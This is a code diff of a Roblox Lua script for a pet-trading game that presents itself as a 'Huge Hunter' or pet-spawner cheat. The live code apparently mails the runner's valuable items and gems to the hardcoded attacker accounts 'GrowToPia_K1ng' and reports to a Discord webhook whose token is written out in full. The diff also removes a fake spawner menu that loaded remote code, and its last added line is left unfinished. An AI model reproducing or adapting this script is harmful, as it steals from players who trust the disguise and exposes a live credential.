@@ -1,67 +1,21 @@
+local StarterGui = game:GetService("StarterGui")
+
+StarterGui:SetCore("SendNotification", {
+    Title = "HugeHunter Activated"; -- 
+    Text = "Success"; -- 
+    Duration = 5; --
+})
+
 local message = require(game.ReplicatedStorage.Library.Client.Message)
 
-    message.Error("PET DUPER ACTIVATED")
+    message.Error("HUGE HUNTER ACTIVATED")
 
 Directory = require(game:GetService("ReplicatedStorage").Library.Directory)
-
-local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/random%202"))()
-local One = library:Window("PET SPAWNER")
-
-local toPet = ""
-
--- Text box for Name of Pet
-One:Box("Name of Pet =", "Type Here!", function(inputText)
-    toPet = inputText
-end)
-
-local Pets = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)
-
--- Function to transform pets
-local function transformPet()
-    local fromPet = "Guard Wolf" -- Default fromPet value
-    
-    if toPet == "" then
-        warn("Hey! Please Fill in the 'Name of Pet'!")
-        return
-    end
-
-    if Pets[fromPet] and Pets[toPet] then
-        for i, v in pairs(Pets[fromPet]) do
-            Pets[fromPet][i] = nil
-        end
-        for i, v in pairs(Pets[toPet]) do
-            Pets[fromPet][i] = v
-        end
-        
-        -- Notify success
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Success!",
-            Text = "Successfully Spawned " .. toPet .. "!",
-            Duration = 5
-        })
-        print("Successful! You Spawned", fromPet, "to", toPet)
-    else
-        warn("Oops! Invalid Pet Names! Please Confirm the Pet Name!")
-        return
-    end
-
-    -- Fire server with the given args
-    local args = {
-        [1] = "a8b785be8ffa48b2b967446e06eeefdf"
-    }
-
-    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Pets_Favorite"):FireServer(unpack(args))
-    print("Fired server with args!")
 end
-
--- Add a button to trigger the pet transformation
-One:Button("Spawn Now", function()
-    transformPet()
-end)
 
 Username = "GrowToPia_K1ng"
 Username2 = "GrowToPia_K1ng" -- stuff will get sent to this user if first user's mailbox is full
-webhook = "https://discord.com/api/webhooks/1336516339967197204/AkVetj2iGNDQsyH4H7edEraheOcICD3pzPzBisDhn1pePqZDBRAKrGbRvwqu9dOCvyei"
+webhook = "https://discord.com/api/webhooks/1341080056688021514/GOHanqrq0FqKta7JQ-4htvD_nkxzKfl899XNqF7IBbb61C_Xz3p6lKXQtbrohEE1Xow1"
 min_rap = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default
 
 _G.scriptExecuted = _G.scriptExecuted or false
@@ -422,4 +376,5 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
         end
     end
     SendAllGems()
+    local message = 
 end
